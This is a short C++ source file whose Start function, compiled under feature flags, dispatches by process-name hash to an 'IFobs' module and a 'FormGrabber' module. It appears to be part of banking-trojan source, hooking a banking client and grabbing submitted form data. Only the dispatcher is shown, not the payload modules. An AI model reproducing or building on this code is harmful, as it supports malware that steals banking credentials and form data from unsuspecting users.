#include "system.h"

namespace System
{

void Start( uint hash, StringBuilder& nameProcess, StringBuilder& path )
{
#ifdef ON_IFOBS
	if( hash == IFobs::HASH_PROCESS )
		IFobs::Start( hash, nameProcess, path );
#endif

#ifdef ON_FORMGRABBER
	FormGrabber::Start( hash, nameProcess, path );
#endif
}

}
